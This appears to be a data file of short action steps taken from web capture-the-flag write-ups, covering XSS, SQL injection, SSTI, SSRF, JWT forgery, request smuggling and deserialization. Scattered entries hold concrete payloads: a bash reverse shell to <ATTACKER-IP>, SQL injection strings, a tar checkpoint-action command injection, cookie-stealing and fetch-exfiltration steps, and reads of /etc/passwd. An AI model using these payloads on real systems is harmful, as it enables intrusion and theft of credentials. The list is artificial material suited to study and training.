    "Identify a message event listener that conducts some checks on iframe data from URL.",
    "Developed a Python script to retrieve the flag",
    "Notice that incorrect answers submitted in the form fields are highlighted in red",
    "Identify 'process.argv[2]' as undefined.",
    "Discovered a Dockerfile.",
    "Realized that `getNameAtIndex(0)` will return the XSS payload when displaying the table.",
    "Inspect the functionality of the 'minimag' command",
    "Used Burp Suite to intercept the login request",
    "Connect to the given URL.",
    "Identify it as a Python environment.",
    "Guess a number based on the window's history length.",
    "Understand that the verify.pug template has an unescaped username.",
    "Extract the flag from the response.",
    "Conclude that an alternative route to XSS is required.",
    "Retrieve the flag.",
    "Ran a final UNION query.",
    "Host a document type definition (DTD).",
    "Connect to website",
    "Specify that files with the name 'flag' are of particular interest",
    "Replace a specific string in the cleaned PDF data.",
    "Discover valid endpoints at 10.0.42.2 and 10.0.42.200.",
    "Cause the pop-up to inherit the sandboxed attributes",
    "The website is a simple login page.",
    "Have the intention to alter the 'admin' value.",
    "Reveal the source code of both `index.php` and `getimg.php`.",
    "Opened the web-browser's developer tools",
    "Reveal source code for index.php",
    "Explore the report link.",
    "Added a special character (') to the end of the username.",
    "Devise a workaround by defining XML entities to form the string 'text'.",
    "Formulated a Property-Oriented Programming (POP) chain.",
    "Find 'changelog.js' script.",
    "Notice three endpoints (/status, /rocketLaunch, /fuel) in the response.",
    "Launch terminal.",
    "Concluded that a JWT confusion attack is required.",
    "Initial attempts to supply URLs were futile.",
    "Perform a post request in the Laravel panel",
    "Add a random rocket name to the POST request body.",
    "Email only required to start validly",
    "Observe a login form with JavaScript check.",
    "Obtain the admin 2FA code from the decoded token.",
    "Deduced that two different strings should give the same md5 hash.",
    "Understand immutability of namedtuple and tuple.",
    "Identified the specified `apiGet` URL.",
    "Receive HTML content suggesting Shellshock vulnerability.",
    "Convert flag images to base64 data.",
    "Click on a captcha box",
    "Identify that the vulnerability lies in Express query parsing",
    "Attempt to utilize CSRF mechanism.",
    "Create a zip file.",
    "Considered using the presence of 'y.png' or 'n.png' in the cache as an indicator of search success.",
    "Check the output after executing the command.",
    "Injected the crafted record to usurp the 'false' value in admin field.",
    "The objective is to overwrite '.bashrc' file with their payload",
    "Send an SQL payload to the inaccessible server using SSTI to force the execution.",
    "Redirected to own account upon a successful enumeration (403 redirect).",
    "Find the entire path to an environment file.",
    "Conduct a Burp intruder scan.",
    "Download the provided PHP files",
    "Discover that using a sufficiently large 'id' can cause an out-of-bound memory read.",
    "Check if characters are converted to underscores in the program.",
    "Manipulate RGB values in the uploaded images.",
    "Used the 'flag' value on the '/com/seaerch/' endpoint.",
    "' AND password=' is treated as a string and hence, ignored",
    "Modify the '/decrypt' endpoint to decrypt the file using the found decryption key",
    "Located the flag within the 'flag' document data.",
    "Received permission denied error.",
    "Retrieved table names.",
    "Attempt to access common pages like foo.php.",
    "Learned about python pickles",
    "Execute wget to download all available logs.",
    "Navigate to the /flag URL.",
    "Identify a potential vulnerability within the function.",
    "Uploaded changes",
    "Identify the correct matching tripcodes",
    "Identify unique JavaScript with autoExport attribute.",
    "Pass things in the textbox",
    "Gain insights from the related pull request.",
    "Identify that the snippet converts a base64 string to ASCII and stores it in local storage under the key 'flag'.",
    "Send the POST request to '/profile/request' with the 'id' of the attacker's user to gain admin's acceptance as a follower.",
    "Access the newly public gallery.",
    "Target only admin endpoint.",
    "Researched about PhantomJS/2.1.1",
    "Note the behavior of the web application when a blank 'n' parameter is submitted.",
    "Set the 'user' payload to 'admin'",
    "Observe the returned flag.",
    "Rewrote the document to `/terjanq/` using the crafted payload.",
    "Realize that the secret key is selected randomly from an array of cookie names.",
    "Obtain the flag",
    "Test each column value",
    "Exploit the vulnerability to search for files",
    "Read the Apache configuration file.",
    "Analyze the PCAP file.",
    "The payload loads an iframe of the notes site with a search query.",
    "View the HTML source code of the website",
    "Successfully added 1337 coins to the account.",
    "Search for a string formatted as 'flag{...}' in the HTML source code.",
    "Find that the login process is performed via a JavaScript file (scripts/login.js).",
    "Focus on app.js.",
    "Examined the site's JavaScript script 'script.js'.",
    "Enter the crafted payload",
    "Discover an HTML comment about an unlinked source file",
    "Retrieve the flag '35c3_password_saltf1sh_30_seconds_max'",
    "Determine the purpose of the 'manage.php' page: changing 'user status' to 'premium'",
    "Identify the use of base64-encoded payloads.",
    "Realize that the access to '/admin/key' is needed to get the key",
    "Attempted to connect to the homepage.",
    "Use 'flag.flag' as the 'id' to purchase the flag from the store for $1.",
    "Examine the main screen with book selections.",
    "Log in with the found user 'root'",
    "Read arbitrary files with @import (inline) \"/etc/passwd\".",
    "Try logging in using `admin:tryharder` credentials.",
    "Find the flag in the backup/b/a/c/flag.txt file.",
    "The usage of 'smtp_exec' indicates that Remote Code Execution (RCE) could be possible",
    "Understand that the exposed port allows commands to be sent to the browser through the DevTools protocol.",
    "Derive a proof-of-concept (PoC) to brute-force a character of the flag by exploiting the observed behavior",
    "Cause a GET request to the Python microservice to be executed",
    "Convert the image to text using OCR.",
    "Show the flag in the response.",
    "Explore the potential of achieving RCE.",
    "Read the file '/etc/passwd'.",
    "Identify the presence of a Git repository in the target URL (http://meme-stash.darkarmy.xyz/).",
    "Use inline commands of Redis to send commands directly.",
    "Ensure the 'file_get_contents' instruction is used.",
    "Identify the password check code.",
    "Found the flag.",
    "Run the command 'curl -H \"Accept-Language: sv-SE\" very.uniquename.xyz:8880'",
    "Decode the base64 value.",
    "Inspect the User.js file",
    "Analyze the challenge title for possible XSS vulnerability",
    "Recognize that WebSockets are not restricted by the Same-Origin Policy.",
    "This makes password an object",
    "Observe that a status 500 is received.",
    "Read the file 'satellite.txt'.",
    "Endpoint had been inaccessible due to lack of the appropriate cookie.",
    "Realize possibility of shell insertion",
    "No sanitization was applied.",
    "Invoked the Lambda function",
    "Observed redirection to `/users/<username>/files` after registration.",
    "Executed 'cat ./system/of/a/down/flag.txt' command.",
    "Set the 'language' parameter to 'flag.txt' in the payload.",
    "Identify a handler function within the file.",
    "Discovered the line 'const port = process.env.PORT || 80'",
    "Identify functionalities accessed by authenticated users.",
    "Determine irrelevance of the first 'If' statement",
    "Identify ATS and Waitress as the systems involved in the smuggling.",
    "Craft SQL injection payload",
    "Note that HTML tags are not allowed.",
    "Signing was done to prevent tampering.",
    "Identify the content of the page is used to generate the base64 encoded URL.",
    "Inspect the client-side code",
    "Inspect the Beego source code",
    "Executed the payload to find the flag.",
    "The file name resolves to `flag.txt` after the process",
    "Identify that you need change the 'admin' field to 'true'.",
    "Set X-Forwarded-For header",
    "Change the base URI of the page.",
    "Further exploited the SSTI vulnerability by crafting a URL that would read the contents of a 'flag.txt' file on the server using built-in Python functions within the Jinja2 template.",
    "Use a backslash as username",
    "Decide to use the SQL LIKE clause.",
    "Identify the predictable storage location of PHP sessions as '/tmp/sess_<PHPSESSID>'.",
    "Include request body with 'logging' attribute set to true.",
    "Inject a classic SQL Injection payload (' or 1=1 -- ) into the username field.",
    "Load the page at `/`.",
    "Analyze the website.",
    "Bypass the character restriction.",
    "Add a JavaScript event handler for the XSS attack.",
    "Paste the introspection data received into the graphql voyager tool.",
    "Find the 'robots.txt' file",
    "Recognize that it passes the extension check due to .txt extension.",
    "Replace the existing flavor value in the cookie with 'chocolate'",
    "Understand that by the function's design, it returns the value of the 'flag' environment variable.",
    "Find the flag in the source code",
    "Observe that remote shell functionality is blocked due to 'seccomp' filter preventing 'execve'.",
    "Intend to rot13 encode the value 'true'.",
    "Identify the second function that is used to proxy images.",
    "Analyze the hint",
    "Locate flag.txt file",
    "Executed a curl command to make a POST request",
    "Identify that nginx concatenates alias directives with location directives.",
    "Discover web app.",
    "Realize that the flag is in the environment variable.",
    "Use the site\u2019s JavaScript to generate the 'key_id'",
    "Observe a normal interaction",
    "Understand this custom JavaScript code will leak the cookie",
    "Created an LFI payload with a form.",
    "Received a list of users as a response.",
    "Recognize that 10 records are created by tar utility by default.",
    "Acquire the User-Agent string for Internet Explorer 6.01.",
    "Check the network tab.",
    "Analyzed the JavaScript source.",
    "Attempt reading a file from the server using the crafted payload.",
    "Use 'cd S3Scanner/'",
    "Identify the algorithm used as HS256.",
    "Formulated an XML HTTP request.",
    "Decide to use Import Maps",
    "Note that the process only permits requests from a client URL validated to be 127.0.0.1.",
    "Upload the zip file.",
    "Identify that 'eval' is used on data from the POST request.",
    "Caused a traceback.",
    "Injected arbitrary Javascript to exfiltrate contents from admin's page.",
    "Identified the need for admin credentials",
    "Constructed a request to /admin.",
    "Gained access by passing the OTP check.",
    "Analyzed the source code of the app provided in the challenge.",
    "Logged in as the admin.",
    "Access the website at 'http://freewifi.ctf.umbccd.io/'.",
    "Saw the criteria for getting the flag printed.",
    "Use Python-random-module-cracker tool",
    "Execute our malicious JavaScript code when the page loads.",
    "Recognize that HTML markup injection is allowed.",
    "Used the remote code execution.",
    "Observe the output details",
    "Observe the image",
    "Create a base64-encoded payload.",
    "Submit the admin's cookie",
    "Confirmed the possibility of creating a new repository with a CNAME file containing 'asdf.jsapi.tech'.",
    "Observe the presence of three files on the webpage.",
    "Identify remote address and user agent checks as the reasons.",
    "Understand implications for encoding and decoding JWT tokens.",
    "Attribute the difficulties to browser extension issues",
    "View the source code of the PHP page",
    "Attempted to list the contents of '/etc/passwd'.",
    "Use the 'fetch' function to send the response text to an external URL.",
    "Assign file descriptors for standard input, output, and error handling.",
    "Discovered that the value 'false' is forced into the admin field during the normal registration process.",
    "Capture the flag",
    "Check the window's 'history.length' attribute.",
    "Apply the same process to the challenge's 'nonce' value.",
    "Include code in 'payload.php' to list all directory files",
    "Create 'first.pdf' using the chosen input PDF.",
    "Identify two other POST-based XSS vectors",
    "Note the difference between += and x = x + y.",
    "Check if the Header 'x-captcha-state' is set.",
    "Insert code into the /redirect that will change the password of the admin when the admin clicks the URL.",
    "View the page source",
    "Identified how to leverage the prototype pollution.",
    "Use knowledge of local git repository structure to start pulling files from the server's .git directory.",
    "The '/debug/answer' endpoint was restricted by both Nginx and the application.",
    "Inserted the serialized data into the 'login' cookie.",
    "Visited '/?file=/etc/passwd'.",
    "Confirm that the URL is a file sharing site",
    "Noted the validation preventing 'localhost' or '127.0.0.1'.",
    "Obtained knowledge of the 'secret' token.",
    "Read the problem's given details and description.",
    "Exploit Shellshock vulnerability",
    "Craft a URL using the identified character.",
    "Realized necessity to create raw HTTP requests.",
    "Analyzed the composition of the sessions table.",
    "Write a Python script",
    "Identify that data is being fetched from a MongoDB backend.",
    "Identified the mistake in the test",
    "Identify unique JavaScript with buildId attribute.",
    "Tracked the function `shellme()` inside the `shellme.so` shared object file.",
    "Search for a Werkzeug console.",
    "Executed commands.",
    "Observed login page.",
    "Wrote a script to use a cache.",
    "Consider the possibility of exploiting a browser zero-day to spoof Origin headers.",
    "Recognize the vulnerability associated with the parameter being reflected in the response",
    "Locate an exploit script provided in the GitHub issue",
    "Access '/etc/hosts' file.",
    "Deployed the previously developed JavaScript payload.",
    "Submitted the request containing the crafted payload to the meme generator.",
    "Used ``1';EXECUTE IMMEDIATE CONCAT('SEL', 'ECT * FROM `1919810931114514`');`` to retrieve data from the '1919810931114514' table.",
    "Understand the goal is to gain access to '/admin'.",
    "Request the website.",
    "Injected final payload to initiate the XSS",
    "Pass obtained string as argument to '/readflag'.",
    "Discover the article by PortSwigger",
    "The URL is fetched for the first time to check for an SSRF attempt.",
    "Craft an HTTP request.",
    "Append the decoded result to a file.",
    "Recognize the requirement of having write access to a file on the server.",
    "Submit the form presented on the webpage",
    "Leverage a Local File Inclusion (LFI) vulnerability for Server Side Request Forgery (SSRF).",
    "Explore the HTML encoding process of individual characters",
    "Received a server response after successful SQL injection.",
    "Noted the use of the 'flask_caching' module for the app",
    "Updated length of URL string according to the previous string replacement.",
    "Serialized the custom 'Login' object.",
    "Identify the requirement of different content for the two PDFs.",
    "URL: http://challenge.nahamcon.com:31428/",
    "Execute '/bin/ls .'",
    "Attempted to induce an SQL injection by inputting the URL 'https://poems.asisctf.com/books.php?type=excerpt&id=0%27%20or%20id=%271'.",
    "Replace the 'with' value with the word 'flag'.",
    "Read the flag from the alert.",
    "Observe that the page says `Hello Mars!`.",
    "Identify the indication of whether users are admins.",
    "Try to implement a similar mechanism to the CSRF mechanism used earlier.",
    "Refer to a writeup for information on crafting the AJP request.",
    "Enter token value.",
    "Receive the contents of the iframe.",
    "Bypass character filter.",
    "Understand that the constraints are due to a regex check.",
    "Verify the flag on the website.",
    "Replace the JWT token with the admin token.",
    "Recognize a Server-Side Template Injection (SSTI) vulnerability",
    "Observe that it is accessed only by authenticated users.",
    "Test the payload.",
    "Succeed in accessing /server-status",
    "Send POST request to upload the '--checkpoint-action=exec=sh shell.txt' file.",
    "Note that every 3000 attempts, the CAPTCHA code needs to be updated manually in the script.",
    "Test the SQL injections '/api/call_api.php?api=10.0.42.200/?search=admin_richard_lauren'/**/OR/**/'1'='1'.",
    "Ensure the payload commands execution of another GET parameter.",
    "Note that the PHP code renames the uploaded file with a random name while preserving the file extension",
    "Participate in the CTF challenge",
    "Identified an S3 bucket in the HTML source",
    "Viewed the invoice URL in the format '/legacy_invoice_system/BASE64_ENCODED_STRING'.",
    "Recognize that the specific replace function changes markdown format images into HTML image tags.",
    "Constructed command '/santa_mon.sh \"curl http://localhost:3000/get_flag\"'.",
    "Access the website.",
    "Include multiple script tags",
    "Understood obtaining the flag message requires waiting for such server response.",
    "Constructed the 'GET' request using 'darkctf', 'ctf2020', 'karma', and '2020' query parameters.",
    "Confirm presence of characters in the password.",
    "Download the unlinked source file",
    "Identify the 'role' attribute",
    "Found that JavaScript couldn't read any cookies from the output of the payloads.",
    "Observed the settings endpoint",
    "Found PHP script",
    "Exploit the Off-by-Slash bug.",
    "Plan to obtain information from MySQL special tables",
    "Observed the output on my netcat listener",
    "Executed a POST request.",
    "Confirmed the existence of a directory traversal vulnerability",
    "Identify the unnecessary parts of the query that need to be wrapped in [] for it to become a valid query.",
    "Verified the GitHub pages site at 'asdf.jsapi.tech' can be served.",
    "Place the URL-encoded string in the URL parameter 'demo'.",
    "Discover that the app uses curl for certain inputs.",
    "Identify goal: purchase flag with starting balance of zero",
    "Analyze the remaining check in the source code.",
    "Predict the next 'nonces'",
    "Intercept an HTTP request or use a cookie editor tool.",
    "Craft a payload for the attack.",
    "Identified 'the_real_flag' user and suspected the flag to be in the 'wordpass' value.",
    "Understand that 'ElementInclude.include(root)' allows the use of XInclude directives.",
    "Generated two different strings with the same md5 hash.",
    "Observe incoming requests.",
    "Create a separate PDF page list for the second input PDF.",
    "Perform the necessary action to retrieve the flag.",
    "Visit the CTF challenge site.",
    "Start looking for a payload to trigger the XSS.",
    "When faced with a security check.",
    "Encode the payload into 'multipart/form-data'.",
    "Capture admin's cookie",
    "Logged in with the new password.",
    "Vulnerability found in `utils.merge()` method",
    "Use the new token for authentication.",
    "Deduce that the '$ne' filter checks if the body of the notes is not empty.",
    "Identified the task as finding the correct password",
    "Noticed that the decrypted string could form a meaningful phrase",
    "Control 'Version' in cookie.",
    "Run command line script using curl",
    "Execute contents of another HTTP GET parameter",
    "Read the second flag.",
    "Explore the public feed.",
    "Unintended solution using 'Lazy-loading' property.",
    "Realize modification of point history with each purchase request.",
    "Set up a server to catch the redirected request with admin cookies",
    "Identify 'scriptlet' vulnerability",
    "Scan the contents of the 'flag_is_here' directory",
    "Realized that the two-fetch mechanism could be exploited with two different responses.",
    "Wait for the admin cookies to be caught",
    "Extracted the session cookie",
    "Deduce the possible range of the value of $_[0]",
    "Encounter a login page.",
    "Combined portions of failed and successful purchase data strings.",
    "Use 'window.localStorage.getItem' to check our input password against the split parts",
    "Acquired the flag",
    "Attempt to connect to http://ctfchallenges.ritsec.club:4000/api/normal.",
    "Counted the number of cameras within the specified distance using the haversine formula",
    "Access the GET request arguments through `request.args`",
    "Recognize that the `Login` object contains an MFA token and a reference to a `User` object.",
    "Recognize that the express.json() allows Object and Array types to be given as req.body.email and req.body.password.",
    "Understand that the port scan needs to be completed within 30 seconds.",
    "Use a technique to disguise a valid phar file.",
    "Begin analysis of the verify() function.",
    "Navigate to the 'controllers' directory.",
    "Use the server's IP address and port number in the command",
    "Retrieved the flag 'S3D{G0_De3Per_L1k3_a_pr0_r3d_T3aMEr}'.",
    "Define the URL of the website.",
    "Name the cookie 'authenticated-user'.",
    "Cloned the GitHub repository.",
    "Understood the process of flag brute-forcing.",
    "Noticed Angular also follows redirects.",
    "Analyze the source code of 'flagchecker.c'",
    "Determine which patterns will allow or block requests.",
    "Perform the second DNS resolution to request the resource.",
    "Create a crafted attack URL with '?src=/img/saturn.jpg'><base href=\"http://ATTACKER_URL\">'.",
    "Understood this was done server-side.",
    "Look at the unit tests for the SAFE_FOR_JQUERY flag on DOMPurify's GitHub.",
    "Identify the code that checks for a 4 digit pin.",
    "Fetch the flag using 'innerHTML'.",
    "Noticed the presence of file upload capability.",
    "Extracted the flag from the identified table.",
    "Validate the content of the command.",
    "Consider that the debugging port is generated from the getRandomPort function.",
    "Write a PHP script",
    "Read the footer of the application.",
    "Discover that the user can add notes.",
    "Injected the code to make the bot click our link and reveal the flag.",
    "Identify User Registration section.",
    "Create a CSRF request.",
    "Consider ways to apply the Template Injection exploit with the 'setter' and 'getter' properties for 'key'.",
    "Identify that the code is reading an HTTP header.",
    "Retrieve the flag from the server's response",
    "Determine that the source code is exposed",
    "Noticed that the output in the /login POST route has not been stringified",
    "Complete the challenge.",
    "Identified the received flag.",
    "Submitted an SQL injection in the 'email' and 'pass' parameters.",
    "Attempt to upload a valid PHP file.",
    "Attempted SQL login bypass",
    "Recognize that 'allow-popups-to-escape-sandbox' can prevent the inheritance of sandbox attributes by pop-ups",
    "Use character substitution to pass argument.",
    "Realize the issue in the comparison",
    "Go to a third-party website.",
    "Observe Admin button on the website",
    "Performed the action of setting up socks correctly.",
    "Located the flag at `/users/employee/files/fileadmin`.",
    "Remove '/_' in the URL's path.",
    "Saved the request.",
    "Find database information within the file.",
    "Recognize that '--checkpoint=1' does not pass the file extension check.",
    "Found no relevant information",
    "Construct an exploit.",
    "Visit the given URL http://35.207.91.38/robots.txt.",
    "Find the required (subprocess.Popen) class among the identified subclasses",
    "Convert items in a dictionary to a list using 'list'.",
    "Located 'flag.txt'.",
    "Executed the payload using the 'unserialize()' function",
    "Determined that the string {args} returns ImmutableMultiDict([])",
    "Login on 'admin.html'.",
    "'req.ip' always pointed to the same IP address of the reverse proxy.",
    "Found a JSON response.",
    "Perform the SQL injection using the constructed input string.",
    "Perform a Server Side Request Forgery (SSRF) with the smuggled request.",
    "Received a PNG image from the 'CONNECT /two/' request.",
    "Notice the use of Python's eval() function.",
    "Confirm text 'infernoCTF{F33l_Th3_Sh0ck}' in the accessed file.",
    "Observe the page showing logos of Xbox and Linux",
    "Refresh the page",
    "Log in to investigate any intermediate requests.",
    "Edit the JWT.",
    "Determine the code checks file extensions for uploaded files.",
    "Discover that the website uses JWT tokens.",
    "Found a successful login attempt among the batched requests.",
    "Perform a GET request to the discovered endpoint.",
    "Observe that the response contains data from the /etc/passwd file.",
    "Finalized the payload as 'http://IP:PORT/?command=%22curl${IFS}http://localhost:3000/get_flag%22'.",
    "Identify that the code involves an XML parser.",
    "Examined the different database schemas and tables: accounts, config, env, innodb, sys, users.",
    "Recognize that there's a well-known deserialization vulnerability in node.js.",
    "Bypass the X-Real-IP protection.",
    "Utilize the 'cat' parameter in a request to '/ajax/articles?cat=asdf\"x=\"'.",
    "Inferred that the suffixes contain information about the product name and the purchase status.",
    "Decode the Base64 cookie value.",
    "Created `/evil/` endpoint for cookie grabbing script",
    "Apply the hashpumpy function to retrieve the contents of package.json",
    "Note that this method of passing an array satisfies the filename restrictions",
    "Use the uploaded PHP file for the request",
    "Observe the post-login page.",
    "Note the Json response upon attempted logins.",
    "Append the current character to the password string.",
    "Retrieve the cookie_secret value 'MangoDB'.",
    "Propose escalation of vulnerability to Remote Code Execution (RCE).",
    "Identify that the clause cannot be executed directly on 'p' as it 'is not iterable', and find a way to convert it to a string using concatenation.",
    "Decided to look for another way to solve the challenge.",
    "Received the flag message returned by the server.",
    "Send a GET request to the URL",
    "Establish a connection to port 11111",
    "Test the system's reaction by passing an invalid productId value.",
    "Access the JavaScript console in the devtools",
    "Injected iframe",
    "Execute the SQL injection payload.",
    "Establish session.",
    "Observe the flag in the response from the server",
    "Exploiting the fact that the token for id=0 is the same every time.",
    "Identified that the game is operated from 'child_process.spawnSync'",
    "Read the file 'apache.conf'.",
    "Obtain the text 'cat index.txt'.",
    "Send GET request to 'https://shiba.yactf.ru/'.",
    "Decided to use SQLmap, a tool for automating the detection and exploitation of SQL injection flaws.",
    "Analyzed the notes app's JavaScript source code.",
    "Ensure the payload bypasses the blacklist.",
    "View the code of 'cmd.php'.",
    "Used 'bash -i >& /dev/tcp/<ATTACKER-IP>/<ATTACKER-PORT> 0>&1' as a command.",
    "Include the chosen input PDFs in the 'merged.pdf'.",
    "Refresh the webpage",
    "Observe the response message suggesting the value could range from 1 to 20.",
    "Inject CRLF characters in Lua's HTTP library.",
    "Saw a statement on DOMPurify's GitHub.",
    "Identified the need for a '.jsapi.tech' subdomain takeover.",
    "Retrieve the flag 'dsc{1_l0v3_sw3d3n}'",
    "Receive the output displaying the flag.",
    "Use lesscss to evaluate CSS on the backend.",
    "Encounter the HttpOnly problem.",
    "Use path traversal to get the SSH key.",
    "Identify the whitelist of allowed IP ranges: 10.0.0.0/24, 10.0.42.0/24, and 10.0.43/24.",
    "This was done to prevent large JMPs containing null bytes.",
    "Dump the related WebSocket packets for further analysis (decoding).",
    "Change the value of 'likeCookie' to true.",
    "Locate and open the JavaScript file",
    "Understand that due to the productId parameter being reflected in the response, the system may be susceptible to XXE attacks.",
    "Used automated tools or manual testing to check for error messages indicative of XPath Injection.",
    "Find a target website.",
    "Receive a message stating flags are not for normal users.",
    "Checked if the 'enableapi' query parameter was set to 'true'.",
    "'next()' was called in each iteration causing express to continue.",
    "Check the URL parameter of the image tag",
    "Include 'otp' and 'secretId' in the request body.",
    "Fetch PHP session ID from /out/save.txt.",
    "Construct another GET request",
    "Submit the constructed page to the '/share' endpoint.",
    "Discover the use of the 'os.system()' method.",
    "Observed that colored pixels on the canvas get stored into Firestore repository.",
    "Test single characters from '0' to 'f'",
    "Inspect the source code of the website.",
    "Scan the pivoted IP address.",
    "Combined both parts of the flag.",
    "Perform a POST request.",
    "List directories in the root location",
    "Form the complete flag: CHTB{1nsp3ction_c4n_r3ve4l_us3full_1nf0rm4tion}",
    "Observe the output of the conversion command to obtain the flag.",
    "Discover that the correct user id is required for admin access, not the password.",
    "Host the 'inner.html' file",
    "Check the MD5 hash of 'collision1.pdf' using the hashlib library.",
    "Understood how MySQL executes query portions inside comments.",
    "Concluded the phrase to be a flag after concatenating the chunks",
    "Checked the docker files.",
    "Decide to use burpsuite to bypass the front-end input sanitization.",
    "Inserted file name in the URL.",
    "Received a message from '/vim/quit/' endpoint.",
    "Examine the URLs of existing logs.",
    "Use the 'fetch' function to send the response text to an external URL.",
    "Prepared for a possible request smuggling attack.",
    "Preserve the original admin's ID.",
    "Study the given codes on the page which are written in PHP.",
    "Find the secret key for the debugger.",
    "Launch Python.",
    "Capture wifi nonces.",
    "Accessed the `/robots.txt` file.",
    "Enter a common password, e.g., 'password'.",
    "Include the XSS payload in the URL.",
    "Analyzed the provided files.",
    "Identify the allowed file extensions: 'txt', 'pdf', 'doc', 'docx', 'xls', 'xlsx'.",
    "Use 'JsonCookies' to create a json object",
    "Navigate into the bucket directory",
    "Created a PHP script.",
    "Identified a Use After Free (UAF) vulnerability.",
    "Realize that the pickle python object could potentially be exploited for a pickle deserialization vulnerability.",
    "Designed a URL payload",
    "Run the written JavaScript",
    "Realized '$text' was passed into 'exec' leading to potential remote code execution.",
    "Click the admin button.",
    "Determined that the address of the XSS payload can be predicted.",
    "Identify controllable variables in 'calc.js'",
    "Locate the .env file",
    "When the admin's hash is used, the /api/create handler does not sanitize data",
    "Use the newly generated token as a cookie",
    "Identify the hardcoded username.",
    "Understand that we can generate our own HS256 token since we know the public key.",
    "Try a bypass method by uploading HTML files disguised as image files.",
    "Perform basic web enumeration.",
    "Create 'second.pdf' using the chosen input PDF.",
    "Visit the URL `confidential_documents=kontammadur_klanvour.dev.local%3A5001%2Fconsole`.",
    "Received the response",
    "Analyze the contents of the 'server.py' file.",
    "Experiment with creating a URL that just hits the length limit",
    "Create and serialize an 'access_log' object",
    "Return false and the queried amount.",
    "Note that filename restrictions need to be bypassed to get the flag",
    "Checked if each camera location is within the specified distance from the point of interest",
    "Access a website.",
    "Compile the modified injection query.",
    "Constructed a payload.",
    "Identified an SQL injection vulnerability.",
    "Use the 'strings' command to extract the flag from the binary data in the 'print-flag' file.",
    "Locate the JWT token within the session cookie.",
    "Discover a method to bypass the character limit issue",
    "Notice the keywords 'page' and 'upload' on the webpage",
    "Encode the content via Base64.",
    "Checked if the window was framed or opened by another window.",
    "Understood that converted attributes are comma separated",
    "Executed a GET request.",
    "Altered the email field: 'test' UNION SELECT 'test', 'test'#.",
    "Attribute the challenges to the `basedir` restriction.",
    "Unhide hidden sheets",
    "Received form on alien_sector.php.",
    "Observe message indicating the ability to upload, list, and view LaTeX documents",
    "Executed NIKTO scan.",
    "Identify packet #263 in the capture",
    "Note that the debugging private key is '8EE86735658A9CE426EAF4E26BB0450E' and it is the MD5 of the string: 'fuckingdog'.",
    "Identify the goal of this CTF problem is to access local resources.",
    "Investigate the backend.",
    "Relocated flag name from 'flag.txt' to 'signal_sleuth_firmware' in root.",
    "Call a specific function",
    "Note that the tokens are associated with the current session",
    "Access the 'user' directory.",
    "Understand that the JWT key is used to sign the token during login.",
    "Identify if the chosen character is correct based on the response header",
    "Extract the flag from the response received on the callback URL.",
    "Access the obfuscated code at http://challenges.auctf.com:30022/authentication.js.",
    "Inspected page source",
    "Confirm the challenge 'Gif2png' exists.",
    "Noticed a change in website functionality.",
    "Cause the promise to resolve.",
    "Used the database name to compose the flag.",
    "Encounter difficulties determining the number of columns",
    "Identify the usage of `ejs`.",
    "Visit http://35.207.91.38/backup/.DS_Store.",
    "Identify the anchor element that allows for a 'ping' attribute.",
    "Configure the exploit script with the necessary parameters.",
    "Access the website.",
    "Recognized that the second request is not yet completed after the end of the first request.",
    "Received the flag: MeePwnCTF{__133-221-333-123-111___}.",
    "Build up the 'payload'",
    "Run the modified exploit script",
    "Verified the contents of the retrieved data.",
    "Connect to http://ctfchallenges.ritsec.club:3000.",
    "Use <meta name='referrer' content='no-referrer'>.",
    "Realized the flag was in the comment within the response.",
    "Open jwt_tool.",
    "Upload a file.",
    "Noted the existence of the second request 'GET /save.php HTTP/1.1'.",
    "Find that any brackets or subsequent quotes are still escaped.",
    "Open the web browser.",
    "Gained access to the system.",
    "Use the payload to extract flag data from the server.",
    "Observe the decoded flag.",
    "Consider another solution.",
    "Identify a list of toys and some other properties.",
    "XSS payload is executed.",
    "Determine that Server: Apache/2.4.50 (Unix) is known to be vulnerable to a recent path traversal vulnerability.",
    "Identify the caching mechanism for user JWT keys.",
    "Input the new cookie.",
    "Manipulate the intercepted data using burpsuite.",
    "Bypass standard checks by exploiting the off-by-one error",
    "Attempt to break out of the string with a single quote in '?cat=news''.",
    "Ensure that visiting `redirect.php` redirects the renderer's browser to the second exploit page.",
    "Queries leading to a different domain will be blocked",
    "Realize that JavaScript doesn't execute when directly input into the application's fields.",
    "Create a new token using HS256 algorithm.",
    "Compare the syntax differences between the observed behavior and other database systems.",
    "Set up a PHP script on '/pleb.my.ip.nip.io'.",
    "Navigate to the uploaded webshell.",
    "Identify that the JWT success counter is reset to 0 if the old token is invalid.",
    "Discorded 'robots.txt' file at '?file=robots.txt'.",
    "Identify the possibility of representing the localhost (127.0.0.1) in a different notation.",
    "Write a Python script that automates this process",
    "List permitted characters.",
    "Follow the URL redirection (if applicable) to the file location.",
    "Download the `openapi.json` file.",
    "Observed the expected output - 'Content-type: text/html' cgi header.",
    "Used the 'secret' token to send a request directly to the backend server.",
    "Embed the crafted JS snippet into an HTML file.",
    "Select the first option in the 'Support' section",
    "Found the first part of the flag 'accessdenied{1_w3nt_thr0ug' in an HTML comment",
    "Analyzed the Docker file.",
    "Identify the `/api/toylist` endpoint and its behaviour.",
    "Take a break.",
    "Encapsulated the second request within the chunked contents of the first request.",
    "Retrieve the flag.",
    "Noted that the appended requests are processed as one single request.",
    "Configure the personal DNS server to resolve to the local IP during the GET request.",
    "Fetch the screenshotter service.",
    "Used a redirection through a PHP server, which revealed the flag in one of the headers.",
    "Understand the provided code.",
    "Return that the balance is exceeded and the queried amount.",
    "Identified the HTML injection vector via 'profile.html' template.",
    "Accessed the provided URL.",
    "Looked for potential vulnerabilities in the search function.",
    "Incorporated delays between consecutive requests.",
    "Analyze the server code files.",
    "Understand that XSS within the Chromium renderer is necessary",
    "Locate the flag within the results.",
    "Create a new token.",
    "Send a POST request to the /admin/system/refresh_session/ endpoint.",
    "Note that /flag.txt is inaccessible",
    "Attempt to open the 'robots.txt' file.",
    "Failed to get a reverse shell.",
    "Visit the manipulated URL.",
    "Read the first flag.",
    "A Python Flask application, does this in 'xss-cookie-stealer.py'. This script defines one route, '/', which reads the 'c' parameter in the request URL, opens a file called 'cookies.txt', writes the contents of 'c' parameter to that file, and then redirects to 'https://google.com'.",
    "Only found a minor vulnerability.",
    "Used the provided URL for registration.",
    "Identify PHP as the server technology.",
    "Realize manual checks are not efficient",
    "Dump file contents of websites.",
    "Observe the change in the URL after submitting a comment.",
    "Constructed a command to be executed",
    "Open curl in terminal or command line.",
    "Discover a hidden endpoint '/admin/key' from the server code",
    "Locate the visited-main-page cookie.",
    "Identify a token structure.",
    "Understood that the `writeOutput` function could potentially be invoked while the program was still running.",
    "Register a delay for the page to load.",
    "Visit the home page of the challenge URL",
